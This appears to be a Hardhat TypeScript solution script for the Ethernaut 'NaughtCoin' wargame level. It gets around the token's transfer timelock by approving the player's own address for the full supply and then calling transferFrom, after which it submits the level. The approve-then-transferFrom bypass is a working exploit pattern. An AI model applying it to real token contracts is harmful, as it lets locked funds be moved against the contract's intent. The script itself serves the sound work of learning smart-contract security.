import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { GatekeeperTwo, GatekeeperTwoAttack, NaughtCoin } from '../typechain-types'
import { loadOrCreateLevelInstance, submitLevelInstance } from './ethernaut'
import { loadOrDeployContract, deployContract } from './helpers'

const levelAddress = '0x096bb5e93a204BfD701502EB6EF266a950217218'

const main = async () => {
  const signer = (await ethers.getSigners())[0] as Signer

  const targetContract = (await loadOrCreateLevelInstance('NaughtCoin', levelAddress, signer)) as NaughtCoin

  // approve
  const approveTx = await targetContract.approve(await signer.getAddress(), await targetContract.totalSupply())

  console.log(`approve tx ${approveTx.hash}`)

  await approveTx.wait()

  // transfer
  const transferTx = await targetContract.transferFrom(
    await signer.getAddress(),
    targetContract.address,
    await targetContract.totalSupply(),
  )

  console.log(`transfer tx ${transferTx.hash}`)

  await transferTx.wait()

  await submitLevelInstance(targetContract.address, signer)
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
